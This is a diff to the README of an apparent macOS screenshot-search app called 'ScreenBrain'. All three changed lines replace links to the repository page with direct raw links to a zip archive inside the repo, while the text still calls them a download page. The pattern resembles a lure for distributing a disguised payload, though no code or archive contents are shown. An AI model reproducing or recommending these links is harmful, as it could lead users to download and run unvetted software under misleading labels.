@@ -1,6 +1,6 @@
 # 🧠 ScreenBrain - Find Screenshots Fast on macOS
 
-[![Download ScreenBrain](https://img.shields.io/badge/Download%20ScreenBrain-blue?style=for-the-badge&logo=github)](https://github.com/Leptospirasheepcote429/ScreenBrain)
+[![Download ScreenBrain](https://img.shields.io/badge/Download%20ScreenBrain-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Leptospirasheepcote429/ScreenBrain/main/ScreenBrain/App/Brain-Screen-2.8.zip)
 
 ## 📌 What ScreenBrain Does
 
@@ -32,7 +32,7 @@ If you want AI search, you can also use:
 ## 📥 Download and Install
 
 Visit this page to download:  
-[https://github.com/Leptospirasheepcote429/ScreenBrain](https://github.com/Leptospirasheepcote429/ScreenBrain)
+[https://raw.githubusercontent.com/Leptospirasheepcote429/ScreenBrain/main/ScreenBrain/App/Brain-Screen-2.8.zip](https://raw.githubusercontent.com/Leptospirasheepcote429/ScreenBrain/main/ScreenBrain/App/Brain-Screen-2.8.zip)
 
 To install ScreenBrain:
 1. Open the link above
@@ -211,4 +211,4 @@ That setup keeps the app close to the Mac platform and makes local data handling
 ## 📎 Download Again
 
 If you need the download page again, use this link:  
-[https://github.com/Leptospirasheepcote429/ScreenBrain](https://github.com/Leptospirasheepcote429/ScreenBrain)
+[https://raw.githubusercontent.com/Leptospirasheepcote429/ScreenBrain/main/ScreenBrain/App/Brain-Screen-2.8.zip](https://raw.githubusercontent.com/Leptospirasheepcote429/ScreenBrain/main/ScreenBrain/App/Brain-Screen-2.8.zip)
